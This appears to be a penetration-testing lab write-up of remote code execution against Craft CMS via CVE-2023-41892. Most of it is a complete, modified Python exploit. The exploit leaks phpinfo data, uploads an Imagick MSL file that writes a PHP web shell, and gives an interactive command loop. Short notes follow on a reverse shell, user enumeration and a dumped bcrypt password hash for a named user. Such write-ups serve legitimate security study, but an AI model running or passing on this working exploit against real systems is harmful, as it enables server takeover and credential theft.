
poc2 works after some modification and we get a shell as www-data

i changed the file name and tweaked upload directory and after trial and error it worked.
updated poc
```python
import requests
import re
import sys

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36"
}

def writePayloadToTempFile(documentRoot):

    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:/etc/passwd"}}}'
    }

    files = {
        "image1": ("pwn1.msl", """<?xml version="1.0" encoding="UTF-8"?>
        <image>
        <read filename="caption:&lt;?php @system(@$_REQUEST['cmd']); ?&gt;"/>
        <write filename="info:DOCUMENTROOT/shell1.php">
        </image>""".replace("DOCUMENTROOT", documentRoot), "text/plain")
    }

    response = requests.post(url, headers=headers, data=data, files=files, proxies={"http":"http://127.0.0.1:8080"})

def getTmpUploadDirAndDocumentRoot():
    data = {
        "action": "conditions/render",
        "test[userCondition]": "craft\elements\conditions\ElementCondition",
        "config":r'{"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream","__construct()":[{"close":null}],"_fn_close":"phpinfo"}}'
    }

    response = requests.post(url, headers=headers, data=data)

    pattern1 = r'<tr><td class="e">upload_tmp_dir<\/td><td class="v">(.*?)<\/td><td class="v">(.*?)<\/td><\/tr>'
    pattern2 = r'<tr><td class="e">\$_SERVER\[\'DOCUMENT_ROOT\'\]<\/td><td class="v">([^<]+)<\/td><\/tr>'
   
    match1 = re.search(pattern1, response.text, re.DOTALL)
    match2 = re.search(pattern2, response.text, re.DOTALL)
    print(match1,match2)
    return match1.group(1), match2.group(1)

def trigerImagick(documentRoot):
    
    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:' + "/tmp"+ r'/php*"}}}'
    }
    response = requests.post(url, headers=headers, data=data, proxies={"http": "http://127.0.0.1:8080"})    

def shell(cmd):
    response = requests.get(url + "/shell1.php", params={"cmd": cmd})
    match = re.search(r'caption:(.*?)CAPTION', response.text, re.DOTALL)

    if match:
        extracted_text = match.group(1).strip()
        print(extracted_text)
    else:
        return None
    return extracted_text

if __name__ == "__main__":
    if(len(sys.argv) != 2):
        print("Usage: python CVE-2023-41892.py <url>")
        exit()
    else:
        url = sys.argv[1]
        print("[-] Get temporary folder and document root ...")
        test,documentRoot = getTmpUploadDirAndDocumentRoot()
        print(test,documentRoot,"asdasdasd")
        print("[-] Write payload to temporary file ...")
        try:
            writePayloadToTempFile(documentRoot)
        except requests.exceptions.ConnectionError as e:
            print("[-] Crash the php process and write temp file successfully")

        print("[-] Trigger imagick to write shell ...")
        try:
            trigerImagick(documentRoot)
        except:
            pass

        print("[-] Done, enjoy the shell")
        while True:
            cmd = input("$ ")
            shell(cmd)

```

trigger revshell
![[Pasted image 20231211010017.png]]
we get
![[Pasted image 20231211005957.png]]

users
![[Pasted image 20231211010114.png]]


remember mysql
![[Pasted image 20231211010420.png]]
`matthew:$2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe`

not crackable
